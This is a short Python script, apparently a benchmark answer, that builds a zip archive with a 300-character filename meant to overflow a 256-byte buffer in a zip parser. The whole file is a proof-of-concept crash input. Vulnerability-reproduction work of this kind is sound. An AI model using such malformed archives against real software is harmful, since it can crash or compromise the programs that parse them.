import os
import tempfile
import zipfile
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a zip file with a filename longer than 256 bytes to trigger buffer overflow
        # Filename length needs to exceed 256 characters
        filename_length = 300  # Well above 256 to ensure overflow
        
        # Create a malicious filename that's longer than the buffer
        malicious_filename = "A" * filename_length + ".txt"
        
        # Create in-memory zip file
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zipf:
            # Add a file with the overly long filename
            zipf.writestr(malicious_filename, b"exploit content")
        
        # Return the zip file bytes
        return zip_buffer.getvalue()
